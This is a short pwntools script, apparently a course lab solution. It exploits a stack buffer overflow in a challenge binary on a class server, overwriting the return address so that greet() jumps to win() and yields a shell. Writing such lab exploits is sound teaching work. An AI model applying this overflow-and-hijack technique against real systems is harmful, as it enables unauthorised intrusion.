from pwn import *

# Set CPU context architecture
context.arch = "amd64"

# Launch exploit process 
#p = gdb.debug("./lab5-2.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab5-2.bin")              # run exploit against binary locally without attacking the process to gdb 
p = remote("csc748.hostbin.org", 7052)   # run the exploit against a remote process

# Read prompt
p.recvuntil("name?: ")

# Send overflow bytes plus b"\xcb" to control flow of greet() to return to  win() instead of the next instruction in main()
p.send(b"A"*8 + b"B"*8 + b"C"*8 + b"\xcb")

# Send a new line character to exit the for loop in  get_string()
p.send(b"\n")

# Switch to interactive after gaining shell
p.interactive()
